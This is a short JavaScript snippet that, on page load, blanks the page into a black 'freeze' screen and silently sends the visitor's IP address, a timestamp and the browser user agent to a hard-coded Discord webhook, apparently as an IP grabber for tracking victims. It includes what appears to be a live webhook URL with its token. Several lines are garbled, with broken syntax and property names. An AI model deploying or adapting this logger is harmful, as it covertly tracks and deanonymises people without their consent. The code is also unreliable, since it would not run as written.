document.addEventListener('DOMContentLoaded', (event) => {
 // Freeze the device
 document.body.inner = '<h1>AB</h1>';
 document.body.style.backgroundColor = 'black';
 document.body.style.color = 'white';
 document.body.style.fontSize = '50px';
 document.body.style.display = 'flex';
 document.body.style.justifyContent = '';
 document.body.style.alignItems = 'center';
 document.body.style.height = '100vh';
 document.body.style.margin = '0';

 // Collect IP Address and other data
 fetch('https://api.ipify.org?format=json')
 .then => response.json())
 .then(data => {
 const ipAddress = data.ip;
 const geolocation = 'Country'; // You can use an API to get more precise geolocation
 const timestamp = new Date().toISOString();
 const deviceType = navigator.userAgent;

 // Send data to Discord webhook
 const webhookUrl = 'https://discord.com/api/webhooks/144532358516573759/TQySaIWE1zmIQfLCxROLXcKdqea-l6YOvqeUIA79yW3sLTPGy8TDGdNAY_1dJBM3-l';
 const payload = {
 content: `IP Address: ${ipAddress}\nGeolocation: ${geolocation}\nTimestamp:timestamp}\nDevice Type: ${deviceType}`
 };

 fetch(webhookUrl, {
 method: 'POST',
 headers: {
 'Content-Type': 'application/json'
 },
 body: JSON.stringify(payload)
 })
 .then(response => response.json())
 then(data => {
 console.log('Success:', data);
 })
 .catch((error) => {
 console.error('Error:', error);
 });
 });
});
